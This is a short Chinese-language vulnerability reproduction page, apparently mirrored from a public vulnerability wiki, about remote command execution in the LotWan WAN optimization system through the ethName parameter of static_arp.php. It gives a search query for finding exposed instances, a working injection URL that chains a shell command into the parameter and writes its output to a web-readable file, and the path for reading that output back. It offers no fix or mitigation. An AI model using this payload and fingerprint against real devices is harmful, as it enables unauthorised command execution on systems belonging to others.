---
title: "华夏创新 LotWan广域网优化系统 static_arp.php 远程命令执行漏洞"
date: 2026-10-18 09:15:49
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "华夏创新-LotWan广域网优化系统"
tags:
  - "华夏创新-LotWan广域网优化系统"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

华夏创新 LotWan广域网优化系统 static_arp.php文件参数 ethName存在命令拼接，导致远程命令执行漏洞

## 漏洞影响

```
华夏创新 LotWan广域网优化系统
```

## 网络测绘

```
title="LotWan 广域网优化系统"
```

## 漏洞复现

登录页面

![image-20220519182832800](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191828884.png)

存在漏洞的文件为

```
/acc/bindipmac/static_arp.php?ethName=||id>cmd.txt||
```

![image-20220519182841776](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191828819.png)

再访问 `/acc/bindipmac/cmd.txt`

![image-20220519182859597](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191828666.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-LotWan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
